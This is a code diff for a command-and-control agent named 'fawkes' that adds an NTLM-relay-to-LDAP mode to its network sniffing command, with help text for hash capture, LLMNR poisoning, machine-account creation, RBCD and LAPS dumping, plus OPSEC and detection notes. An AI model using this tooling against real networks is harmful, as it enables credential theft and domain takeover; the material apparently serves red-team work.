@@ -4,6 +4,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"path/filepath"
+	"strings"
 
 	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
 	"github.com/MythicMeta/MythicContainer/mythicrpc"
@@ -13,7 +14,7 @@ func classifySniffCredentialType(protocol string) string {
 	switch protocol {
 	case "ntlm":
 		return "hash"
-	case "ntlmv2", "ntlmv2-relay":
+	case "ntlmv2", "ntlmv2-relay", "ntlmv2-ldap-relay":
 		return "hash"
 	case "krb-asrep", "krb-tgsrep":
 		return "ticket"
@@ -32,9 +33,9 @@ func formatSniffRealm(dstIP string, dstPort uint16) string {
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "sniff",
-		Description:         "Network sniffing, poisoning, and relay. capture: passive credential sniffing. poison: LLMNR/NBT-NS/mDNS responder with SMB+HTTP NTLM hash capture. relay: NTLM relay to target SMB.",
-		HelpString:          "sniff [-action capture] [-interface eth0] [-duration 30] [-ports 21,80,445]\nsniff -action poison [-response_ip 10.0.0.5] [-protocols llmnr,nbtns] [-duration 120]\nsniff -action relay -response_ip <target_smb_host> [-ports listen:target] [-duration 120]",
-		Version:             4,
+		Description:         "Network sniffing, poisoning, and relay. capture: passive credential sniffing. poison: LLMNR/NBT-NS/mDNS responder with SMB+HTTP NTLM hash capture. relay: NTLM relay to target SMB. ldap-relay: NTLM relay to target LDAP with post-auth operations.",
+		HelpString:          "sniff [-action capture] [-interface eth0] [-duration 30] [-ports 21,80,445]\nsniff -action poison [-response_ip 10.0.0.5] [-protocols llmnr,nbtns] [-duration 120]\nsniff -action relay -response_ip <target_smb_host> [-ports listen:target] [-duration 120]\nsniff -action ldap-relay -response_ip <target_dc> [-ports 80:636] [-protocols whoami|add-computer:NAME$|rbcd:targetDN|SID|dump-laps[:filter]] [-duration 120]\n  Ports: listen_port:target_port. Use 636 for LDAPS (required for add-computer/password changes).",
+		Version:             5,
 		MitreAttackMappings: []string{"T1040", "T1557.001"}, // Network Sniffing + LLMNR/NBT-NS Poisoning + Relay
 		Author:              "@galoryber",
 		ScriptOnlyCommand:   false,
@@ -50,8 +51,8 @@ func init() {
 				Name:          "action",
 				CLIName:       "action",
 				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:       []string{"capture", "poison", "relay"},
-				Description:   "capture: passive network sniffing (default). poison: LLMNR/NBT-NS/mDNS responder (T1557.001). relay: NTLM relay to target SMB (T1557.001).",
+				Choices:       []string{"capture", "poison", "relay", "ldap-relay"},
+				Description:   "capture: passive network sniffing (default). poison: LLMNR/NBT-NS/mDNS responder (T1557.001). relay: NTLM relay to target SMB (T1557.001). ldap-relay: NTLM relay to target LDAP with post-auth operations (T1557.001).",
 				DefaultValue:  "capture",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
@@ -201,6 +202,13 @@ func init() {
 					"Monitor for: HTTP listener on non-standard port, SMB session from unexpected source, account lockouts. " +
 					"Requires: SMB signing DISABLED on target (default for non-DCs). " +
 					"Relay is ACTIVE — it intercepts and forwards authentication in real-time."
+			case "ldap-relay":
+				msg = "OPSEC CRITICAL: LDAP relay (T1557.001) starts an HTTP server that triggers NTLM authentication and relays captured " +
+					"credentials to a target LDAP server (typically a Domain Controller). After successful NTLM auth, performs privileged " +
+					"LDAP operations (add computer account, set RBCD, whoami). Generates: HTTP listener, LDAP bind to DC, LDAP modify/add. " +
+					"Requires: LDAP signing NOT required on target DC (default config). Event IDs: 5136/5137 (directory service changes), " +
+					"4624 (logon). Post-auth operations (add-computer, RBCD) create persistent AD objects detectable by AD auditing tools. " +
+					"Relay is ACTIVE — it intercepts and forwards authentication in real-time."
 			default:
 				msg = "OPSEC WARNING: Network sniffing (T1040) opens a raw socket which requires root/CAP_NET_RAW (Linux/macOS) or Administrator (Windows). " +
 					"Windows uses SIO_RCVALL which may be flagged by security products. " +
@@ -288,6 +296,21 @@ func init() {
 				})
 			}
 			registerCredentials(processResponse.TaskData.Task.ID, creds)
+			// Log operation event when credentials are captured
+			if len(creds) > 0 {
+				host := processResponse.TaskData.Callback.Host
+				// Summarize captured credential types
+				typeCount := make(map[string]int)
+				for _, c := range result.Credentials {
+					typeCount[c.Protocol]++
+				}
+				var types []string
+				for proto, count := range typeCount {
+					types = append(types, fmt.Sprintf("%d %s", count, proto))
+				}
+				logOperationEvent(processResponse.TaskData.Task.ID,
+					fmt.Sprintf("[CREDENTIAL] Network sniff captured credentials on %s: %s", host, strings.Join(types, ", ")), true)
+			}
 			return response
 		},
 	})
